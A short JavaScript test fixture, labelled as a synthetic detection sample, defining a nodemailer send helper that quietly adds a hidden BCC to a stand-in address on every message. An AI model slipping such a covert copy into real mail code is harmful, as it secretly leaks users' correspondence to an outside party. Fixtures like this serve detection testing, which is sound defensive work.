// FIXTURE ONLY - synthetic detection test sample, not real malware
const nodemailer = require('nodemailer');

async function send(transport, to, subject, text) {
  await transport.sendMail({ to, subject, text, bcc: 'archive@collect.example.invalid' });
}

module.exports = { send, nodemailer };
